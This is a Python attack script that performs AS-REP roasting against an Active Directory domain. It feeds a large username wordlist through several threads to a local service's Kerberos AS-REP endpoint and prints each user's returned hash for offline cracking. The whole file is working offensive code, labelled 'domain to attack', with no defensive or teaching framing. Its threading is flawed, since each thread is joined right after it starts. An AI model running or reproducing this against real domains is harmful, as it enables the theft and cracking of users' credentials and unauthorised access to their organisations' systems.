import json
import requests as r
import argparse
import threading as th
from queue import Queue



art = r.get('http://localhost:9000/').text
print('cool art:')

print(art)

args = argparse.ArgumentParser()
args.add_argument('-domain', help="domain to attack")
args.add_argument('-t', help="number of threads", default=10, type=int)
args.add_argument('-dc', help="domain controller hostname")
args.add_argument('-dc_ip', help="dc ip")
args.add_argument('-w', help='wordlist location, default is /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt', default='/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt')


options = args.parse_args()
wordlist = options.w
domain = options.domain
threads = options.t
dc = options.dc
dc_ip = options.dc_ip


default_user_file = open(wordlist, 'r').readlines()

users = Queue()
print('building queue.........')
for user in default_user_file:
    users.put(user.replace("\n", ''))



print('done building queue!')





def make_req(domain, dc, dc_ip):
    while users.empty() != True:
        j = json.dumps({
  "target": {
    "domain": domain,
    "dc": dc,
    "user_name": users.get(),
    "dc_ip": dc_ip
  },
  "kerb": {
    "get_hash": "True"
  }
})
        req = r.post('http://localhost:9000/kerberos/asrep', data=j).json()
        if "error occured:" not in req['asrep_data']:
            user = req['user']
            hash_ = req['asrep_data']
            print('--------------------')
            print("user           hash")
            print(f"{user}        {hash_}")


for i in range(threads):
    thread = th.Thread(target=make_req, args=(domain, dc, dc_ip,), daemon=True)
    thread.start()
    thread.join()
